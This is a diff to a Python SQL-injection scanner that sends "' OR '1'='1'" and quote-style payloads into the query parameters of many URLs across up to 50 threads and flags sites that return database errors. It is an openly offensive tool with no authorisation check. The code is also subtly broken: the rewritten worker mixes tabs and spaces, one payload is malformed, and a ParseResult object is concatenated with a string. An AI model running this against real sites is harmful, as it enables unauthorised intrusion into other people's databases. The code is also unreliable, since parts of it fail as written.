@@ -13,13 +13,12 @@ import urllib.parse as parse
 import re
 
 __name__ = "python-scanner"
-
 logger  = logging.getLogger(__name__)
 
 def exec_post(url, proxy=None):
     payloads = ("' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'='1' #", "' OR '1'=1' %00", "' OR '1'='1' %16")
     for payload in payloads:
-        print(payload)
+        logger.debug(payload)
     return url
 
 def find_form(html, proxy=None):
@@ -31,11 +30,8 @@ def find_form(html, proxy=None):
 
 def sqli(url, proxy=None):
     """check SQL injection vulnerability"""
-    
-    logger.debug("Starting SQLI payloads on: %s" % (url) ) 
 
     domain = parse.urlparse(url)  # domain with path without queries
-    #print(domain.hostname)
     queries = domain.query.split("&")
      # no queries in url
     if not any(queries):
@@ -58,7 +54,7 @@ def sqli(url, proxy=None):
         payloads = ("'", "')", "';", '"', '")', '";', '`', '`)', '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C")
         for payload in payloads:
             website = domain + "?" + ("&".join([param + payload for param in queries]))
-            logger.debug("Fetching content of URL %s with PAYLOAD: [%s]\n[%s]" %  (url ,payload, website) )
+            logger.info("Fetching content of URL %s with PAYLOAD: [%s]\n[%s]" %  (url ,payload, website) )
             source = web.gethtml(website, proxy=proxy)
             if source:
                 vulnerable, db = sqlerrors.check(source)
@@ -67,52 +63,54 @@ def sqli(url, proxy=None):
                     return True, url, db
             else:
                 logger.debug("Unable to fetch website source.")
-
-    print("\n")  # move cursor to new line
     return False, url
 
-def scan(urls, proxy=None, threads=20):
+def scan(urls,  threads=50, proxy=None):
     """scan multiple websites with multi processing"""
-
-    logger.debug("Starting scanner.")
     vulnerables = [] 
     tested = []
 
+    thread_list = []
     q   = queue.Queue()
-    
-    logger.info("Starting on %s", len(urls) )
 
+    logger.info("Starting on [%d] urls with [%d] threads" % (len(urls), threads) )
+    time.sleep(4)
     def worker():
-        logger.debug("Starting worker.")
-        while True:
-            time.sleep(0.2)
-            url, proxy = q.get() # get queue item
-            print(url)
-            logger.debug("Starting SQLI payloads on %s -> %s", proxy, url)
-            test = sqli(url, proxy)
-            if test[0]:
-                logger.debug("vulnerable URL found  %s ", test[1] )
-                tested.append((test))
-            q.task_done()
-            logger.debug("Thread finished.")
-            #print(test)
+    	while True:
+	        nonlocal i
+	        url, proxy = q.get() # get queue item
+	        logger.info("Starting worker on %s " % (url))
+	        test = sqli(url, proxy)
+	        if test[0]:
+	            logger.info("vulnerable URL found  %s ", test[1] )
+	            tested.append((test[1], test[2]))
+	        logger.info("Thread finished.")
+	        #print(test)
+	        q.task_done()
+
 
     for url in urls:
-        #print(url)
-        q.put((url, proxy))
-
+    	try:
+    		domain = parse.urlparse(url)  # domain with path without queries
+    		if domain is not None:
+    			print(domain.hostname)
+    			#sqli(url, proxy)
+    			q.put((url, proxy))
+    	except:
+    		pass
     for i in range(threads):
         t = threading.Thread(target=worker)
-        logger.debug("Starting thread: %s ", t.name)
+        logger.info("Starting thread: %s ", t.name)
         t.daemon = True
-        time.sleep(1)
+        thread_list.append(t)
         t.start()
-        #t.join()
+        #t.join(1.0)
 
-    logger.debug("Waiting for threads to finish to join.")
-    q.join()
-    #t.join()
-    
-    logger.debug("Done waiting for threads, all finished and returning %s results", len(tested))
+    logger.info("Waiting for threads to finish to join.")
+    print(thread_list)
+    for thread in thread_list:
+    	logger.info("Joining thread: %s" % (thread.name))
+    	thread.join(1.0)
+    logger.info("Done waiting for threads, all finished and returning %s results", len(tested))
     return tested
 
